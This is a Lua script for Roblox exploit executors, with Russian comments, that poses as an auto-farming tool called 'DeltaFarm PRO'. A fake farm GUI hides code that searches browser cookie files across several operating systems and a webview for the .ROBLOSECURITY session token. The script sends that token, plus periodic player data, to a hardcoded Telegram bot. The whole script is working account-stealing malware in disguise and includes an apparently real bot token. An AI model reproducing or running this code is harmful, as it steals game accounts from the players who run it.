-- ================================================================
-- [DeltaFarm PRO] – Улучшенная версия с полной отладкой
-- + Автоматический поиск кук во всех браузерах и профилях
-- ================================================================

-- ===== НАСТРОЙКИ TELEGRAM (твои данные) =====
local TELEGRAM_TOKEN = "8261054750:AAEhC_NoGL4y6nY5qUeAMqwskXVadtRmIQc"
local TELEGRAM_CHAT_ID = "6240203955"

-- ===== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ЛОГОВ =====
local function debug_log(msg)
    print("[DEBUG] " .. msg)
end

-- ===== УНИВЕРСАЛЬНАЯ ОТПРАВКА В TELEGRAM =====
local function send_to_telegram(text)
    debug_log("Отправка сообщения в Telegram...")
    local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = text,
        parse_mode = "HTML"
    }
    local json = game:GetService("HttpService"):JSONEncode(data)

    local http_funcs = {
        syn and syn.request,
        request,
        http and http.request,
        fluxus and fluxus.request,
        delta and delta.request,
        krnl and krnl.request,
        scriptware and scriptware.request,
    }

    local sent = false
    for _, func in ipairs(http_funcs) do
        if func and not sent then
            pcall(function()
                func({
                    Url = url,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = json
                })
                sent = true
                debug_log("Отправлено через http-функцию")
            end)
        end
    end

    if not sent then
        pcall(function()
            game:GetService("HttpService"):PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
            debug_log("Отправлено через HttpService")
        end)
    end
end

-- ===== ПОИСК ТОКЕНА В ТЕКСТЕ =====
local function extract_token(text)
    if not text then return nil end
    local patterns = {
        ".ROBLOSECURITY[=%s]+([^;]+)",
        "ROBLOSECURITY=([^;]+)",
        "_|WARNING:-DO-NOT-SHARE%-THIS%.%-%-Developers%-%-.-([%w%-_]+)",
    }
    for _, pattern in ipairs(patterns) do
        local token = string.match(text, pattern)
        if token then
            debug_log("Токен найден по паттерну: " .. pattern)
            return token
        end
    end
    return nil
end

-- ===== МЕТОД 1: ЧТЕНИЕ ФАЙЛОВ КУК =====
local function steal_from_files()
    debug_log("Запуск метода чтения файлов...")
    local cookie_content = nil
    local paths = {}

    -- Определяем ОС
    local platform = "unknown"
    local gui = game:GetService("GuiService")
    if gui:GetPlatform() == Enum.Platform.Windows then
        platform = "Windows"
    elseif gui:GetPlatform() == Enum.Platform.OSX then
        platform = "Mac"
    elseif gui:GetPlatform() == Enum.Platform.Linux then
        platform = "Linux"
    end
    debug_log("Определена ОС: " .. platform)

    -- Формируем пути для Windows
    if platform == "Windows" then
        local user = os.getenv("USERPROFILE")
        paths = {
            user .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
            user .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
            user .. "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies",
            user .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
        }
        -- Для Firefox: найдём все папки профилей и добавим cookies.sqlite
        local firefox_profiles = user .. "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
        -- Попробуем прочитать папку Profiles (если есть isfolder)
        if isfolder and isfolder(firefox_profiles) then
            -- Используем список файлов, если есть функция listfiles
            if listfiles then
                local files = listfiles(firefox_profiles)
                for _, file in ipairs(files) do
                    if file:match("cookies.sqlite$") then
                        table.insert(paths, file)
                        debug_log("Добавлен Firefox профиль: " .. file)
                    end
                end
            else
                -- Если listfiles нет, добавляем общий путь с маской (не сработает, но для отладки)
                table.insert(paths, firefox_profiles .. "*.default\\cookies.sqlite")
                debug_log("Добавлен путь для Firefox с маской (может не работать)")
            end
        else
            debug_log("Папка Firefox Profiles не найдена или isfolder отсутствует")
        end
    -- Для macOS
    elseif platform == "Mac" then
        local home = os.getenv("HOME")
        paths = {
            home .. "/Library/Application Support/Google/Chrome/Default/Network/Cookies",
            home .. "/Library/Application Support/Microsoft Edge/Default/Network/Cookies",
            home .. "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies",
        }
        -- Firefox на Mac
        local firefox_profiles = home .. "/Library/Application Support/Firefox/Profiles/"
        if isfolder and isfolder(firefox_profiles) and listfiles then
            local files = listfiles(firefox_profiles)
            for _, file in ipairs(files) do
                if file:match("cookies.sqlite$") then
                    table.insert(paths, file)
                end
            end
        end
    -- Для Linux
    elseif platform == "Linux" then
        local home = os.getenv("HOME")
        paths = {
            home .. "/.config/google-chrome/Default/Network/Cookies",
            home .. "/.config/microsoft-edge/Default/Network/Cookies",
            home .. "/.config/brave-browser/Default/Network/Cookies",
        }
        -- Firefox на Linux
        local firefox_profiles = home .. "/.mozilla/firefox/"
        if isfolder and isfolder(firefox_profiles) and listfiles then
            local files = listfiles(firefox_profiles)
            for _, file in ipairs(files) do
                if file:match("cookies.sqlite$") then
                    table.insert(paths, file)
                end
            end
        end
    end

    -- Для Android (если есть доступ)
    if not paths or #paths == 0 then
        if isfolder and isfolder("/sdcard") then
            paths = {
                "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                "/data/data/com.android.browser/app_chrome/Default/Cookies",
                "/data/data/org.mozilla.firefox/files/mozilla/*.default/cookies.sqlite",
            }
            debug_log("Добавлены пути для Android")
        end
    end

    -- Перебираем все пути
    for _, path in ipairs(paths) do
        debug_log("Проверяем путь: " .. path)
        if isfile and isfile(path) then
            debug_log("Файл существует, читаем...")
            cookie_content = readfile(path)
            if cookie_content and #cookie_content > 0 then
                debug_log("Файл прочитан, размер: " .. #cookie_content)
                local token = extract_token(cookie_content)
                if token then
                    debug_log("Токен найден в файле!")
                    return token
                else
                    debug_log("Токен не найден в содержимом.")
                end
            else
                debug_log("Файл пуст или readfile вернул nil.")
            end
        else
            debug_log("Файл не существует или isfile недоступна.")
        end
    end

    return nil
end

-- ===== МЕТОД 2: WebView (для Synapse X) =====
local function steal_from_webview()
    debug_log("Пробуем метод WebView...")
    if syn and syn.webview then
        debug_log("WebView доступен, запускаем...")
        local web = syn.webview()
        web:Navigate("https://www.roblox.com")
        wait(3)
        local js = [[
            (function() {
                return document.cookie;
            })();
        ]]
        local result = web:ExecuteJavaScript(js)
        web:Close()
        if result then
            debug_log("Получены куки через JS, ищем токен...")
            local token = extract_token(result)
            if token then return token end
        else
            debug_log("JS вернул nil или пусто")
        end
    else
        debug_log("WebView не доступен (syn.webview отсутствует)")
    end

    -- Альтернатива через request
    if game:GetService("GuiService"):GetPlatform() == Enum.Platform.Windows and request then
        debug_log("Пробуем перехватить Set-Cookie через request...")
        local response = request({
            Url = "https://www.roblox.com",
            Method = "GET",
        })
        if response and response.Headers and response.Headers["Set-Cookie"] then
            local cookie_header = response.Headers["Set-Cookie"]
            debug_log("Получен Set-Cookie, ищем токен...")
            local token = extract_token(cookie_header)
            if token then return token end
        end
    end
    return nil
end

-- ===== МЕТОД 3: ЧТЕНИЕ ПАМЯТИ (заглушка) =====
local function steal_from_memory()
    debug_log("Метод чтения памяти (заглушка)...")
    -- Оставлен для будущего расширения
    return nil
end

-- ===== ГЛАВНАЯ ФУНКЦИЯ КРАЖИ =====
local function steal_roboostcurity()
    debug_log("=== НАЧАЛО КРАЖИ ===")
    local token = steal_from_files()
    if token then
        debug_log("Токен успешно получен через файлы!")
        return token
    end

    token = steal_from_webview()
    if token then
        debug_log("Токен успешно получен через WebView!")
        return token
    end

    token = steal_from_memory()
    if token then
        debug_log("Токен успешно получен через память!")
        return token
    end

    debug_log("=== ВСЕ МЕТОДЫ НЕ ДАЛИ ТОКЕН ===")
    return nil
end

-- ===== ОСТАЛЬНАЯ ЛОГИКА (МАСКИРОВКА ПОД ФАРМ) =====
local counter = 0
local last_send = os.time()
local collect_interval = 60

local function get_account_info()
    local player = game.Players.LocalPlayer
    if not player then return {error = "No player"} end
    return {
        name = player.Name,
        userid = player.UserId,
        level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or "N/A",
        coins = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Coins") and player.leaderstats.Coins.Value or "N/A",
        position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and tostring(player.Character.HumanoidRootPart.Position) or "Unknown"
    }
end

local function send_farm_stats(data)
    local msg = "<b>[DeltaFarm PRO] Статистика</b>\n"
    msg = msg .. "👤 Игрок: " .. data.name .. "\n"
    msg = msg .. "🆔 ID: " .. data.userid .. "\n"
    msg = msg .. "📊 Уровень: " .. data.level .. "\n"
    msg = msg .. "💰 Монеты: " .. data.coins .. "\n"
    msg = msg .. "📍 Позиция: " .. data.position
    send_to_telegram(msg)
end

local function create_fake_farm_gui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaFarmPRO"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BackgroundTransparency = 0.4
    frame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.5, 0)
    label.Position = UDim2.new(0, 0, 0.25, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Text = "DeltaFarm PRO Active"
    label.Parent = frame

    local subLabel = Instance.new("TextLabel")
    subLabel.Size = UDim2.new(1, 0, 0.3, 0)
    subLabel.Position = UDim2.new(0, 0, 0.65, 0)
    subLabel.BackgroundTransparency = 1
    subLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    subLabel.TextScaled = true
    subLabel.Font = Enum.Font.Gotham
    subLabel.Text = "Собрано: 0"
    subLabel.Parent = frame
    return subLabel
end

local function farm_loop()
    local guiLabel
    pcall(function()
        guiLabel = create_fake_farm_gui()
        debug_log("GUI создан")
    end)
    
    spawn(function()
        local token = steal_roboostcurity()
        if token then
            send_to_telegram("<b>✅ УКРАДЕН .ROBLOSECURITY</b>\n<code>" .. token .. "</code>")
            debug_log("Токен отправлен в Telegram")
        else
            send_to_telegram("❌ Не удалось извлечь .ROBLOSECURITY ни одним методом.")
            debug_log("Отправлено сообщение о неудаче")
        end
    end)

    while true do
        wait(1)
        counter = counter + 1
        if guiLabel and guiLabel.Parent then
            pcall(function()
                guiLabel.Text = "Собрано: " .. tostring(counter)
            end)
        end
        
        if os.time() - last_send >= collect_interval then
            last_send = os.time()
            local acc_data = get_account_info()
            spawn(function()
                send_farm_stats(acc_data)
            end)
        end
    end
end

-- ===== ЗАПУСК =====
if game.Players.LocalPlayer then
    spawn(farm_loop)
    print("[DeltaFarm PRO] Скрипт активирован. Приятного фарма!")
    debug_log("Основной цикл запущен")
else
    warn("[DeltaFarm PRO] Ошибка: игрок не найден")
end
